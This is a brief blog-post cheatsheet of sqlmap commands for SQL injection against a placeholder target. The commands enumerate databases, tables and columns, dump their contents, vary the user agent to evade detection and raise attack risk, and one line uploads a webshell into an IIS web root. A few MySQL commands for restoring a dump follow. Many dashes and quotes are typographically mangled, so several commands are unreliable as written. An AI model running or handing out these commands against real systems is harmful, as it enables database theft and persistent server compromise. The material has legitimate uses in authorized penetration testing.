---
layout: post
title: MySQL Cheatsheet
---

SQLMAP Commands Cheatsheet – 
Fetch DB 	sqlmap -u “Your Target” –dbs
Fetch Tables 	sqlmap -u “Your Target” -D <Database> –tables
Fetch Columns 	sqlmap -u “Your Target” -D <Database> -T <Table Name> –columns
Data Dump 	sqlmap -u “Your Target” -D <Database> -T <Table Name> -C <Columns Names> –dump
Particular Table Dump 	sqlmap -u “Your Target” -D <Database> -T <Table Name> –dump
Random Agent 	sqlmap -u “Your Target” –dbs –random-agent
Post Data Testing 	sqlmap -u “Your Target” –data=”<Dynamic Parameter Information>” –dbs
Scanning from file 	sqlmap -r <file.txt> –dbs
Cookie Embed 	sqlmap -u “Your Target” –cookie=”<Cookie Information>” –dbs
Increase Level and Risk 	sqlmap -u “Your Target” –dbs –risk=3 –level=5
sqlmap -r requestfile --batch --all
upload webshell with: sqlmap -r requestfile --file-write=/folder/webshell.php --file-dest=c:/inetpub/wwwroot/webshell.php

create database data;
use data;
create table data(id int, data blob);
mysql -u root -p data < dba.dmp
